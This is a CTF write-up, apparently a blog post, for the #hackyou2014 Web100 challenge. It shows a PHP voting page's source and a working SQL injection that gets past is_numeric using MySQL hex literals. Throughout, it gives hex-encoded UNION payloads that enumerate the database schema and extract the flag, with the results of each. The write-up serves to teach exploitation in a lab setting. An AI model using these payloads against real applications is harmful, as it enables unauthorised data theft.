+++
author = "pwntester"
categories = ["CTF", "PHP", "HackYou2014"]
date = 2014-01-15T23:52:00Z
description = ""
draft = false
slug = "hackyou2014-web100-write-up"
tags = ["CTF", "PHP", "HackYou2014"]
title = "#hackyou2014 Web100 write-up"

+++


In this [level](http://hackyou2014tasks.ctf.su:10080/) we are presented with some logos we can vote.

![](/images/octopress/web100-1.png)

If we look at the source code we can see an interesting comment:

```lang-html line-numbers 
...
<!-- TODO: remove index.phps -->
...
```

We can grab the source code:

```lang-php line-numbers 
 <?php
include 'db.php';
session_start();
if (!isset($_SESSION['login'])) {
    $_SESSION['login'] = 'guest'.mt_rand(1e5, 1e6);
}
$login = $_SESSION['login'];

if (isset($_POST['submit'])) {
    if (!isset($_POST['id'], $_POST['vote']) || !is_numeric($_POST['id']))
        die('Hacking attempt!');
    $id = $_POST['id'];
    $vote = (int)$_POST['vote'];
    if ($vote > 5 || $vote < 1)
        $vote = 1;
    $q = mysql_query("INSERT INTO vote VALUES ({$id}, {$vote}, '{$login}')");
    $q = mysql_query("SELECT id FROM vote WHERE user = '{$login}' GROUP BY id");
    echo '<p><b>Thank you!</b> Results:</p>';
    echo '<table border="1">';
    echo '<tr><th>Logo</th><th>Total votes</th><th>Average</th></tr>';
    while ($r = mysql_fetch_array($q)) {
        $arr = mysql_fetch_array(mysql_query("SELECT title FROM picture WHERE id = ".$r['id']));
        echo '<tr><td>'.$arr[0].'</td>';
        $arr = mysql_fetch_array(mysql_query("SELECT COUNT(value), AVG(value) FROM vote WHERE id = ".$r['id']));
        echo '<td>'.$arr[0].'</td><td>'.round($arr[1],2).'</td></tr>';
    }
    echo '</table>';
    echo '<br><a href="index.php">Back</a><br>';
    exit;
}
<html>
<head>
    <title>Picture Gallery</title>
</head>
<body>
<p>Welcome, <?php echo $login; ?></p>
<p>Help us to choose the best logo!</p>
<form action="index.php" method="POST">
<table border="1" cellspacing="5">
<tr>
$q = mysql_query('SELECT * FROM picture');
while ($r = mysql_fetch_array($q)) {
    echo '<td><img src="./images/'.$r['image'].'"><div align="center">'.$r['title'].'<br><input type="radio" name="id" value="'.$r['id'].'"></div></td>';
}
</tr>
</table>
<p>Your vote:
<select name="vote">
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="5">5</option>
</select></p>
<input type="submit" name="submit" value="Submit">
</form>
</body>
</html>
<!-- TODO: remove index.phps -->
```

We cannot inject in **vote** because it is casted to an integer and the value is verified but we can inject in **id** if we can bypass the **is_numeric** function. Actually, it was quite easy, we can submit hexadecimal values and benefit from how **mysql** handles [hex literals](http://dev.mysql.com/doc/refman/5.0/en/hexadecimal-literals.html).
We can verify the injection submiting:

```lang-html line-numbers 
0x39393939393939393939393920756e696f6e20616c6c202873656c656374202748656c6c6f21212729
999999999999 union all (select 'Hello!!')
```

The server will return:

![](/images/octopress/web100-2.png)

Ok, now we can try something more interesting:

```lang-html line-numbers 
0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428736368656d615f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e736368656d61746129
999999999999 union all (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)
```

```lang-html line-numbers 
information_schema,mysql,performance_schema,task,test
```

From "task"

```lang-html line-numbers 
0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e434154287461626c655f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c6573205748455245207461626c655f736368656d61203d20277461736b2729
999999999999 union all (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'task')
```

```lang-html line-numbers 
Flag,picture,vote
```

Now the columns:

```lang-html line-numbers 
0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428636f6c756d6e5f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73205748455245207461626c655f736368656d61203d20277461736b2720616e64207461626c655f6e616d653d27466c61672729
999999999999 union all (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = 'task' and table_name='Flag')
```

```lang-html line-numbers 
flag
```

And finally:

```lang-html line-numbers 
0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428666c6167292066726f6d20466c616729
999999999999 union all (SELECT GROUP_CONCAT(flag) from Flag)
```

```lang-html line-numbers 
CTF{820178c33c03aaa7cfe644c691679cf8}
```




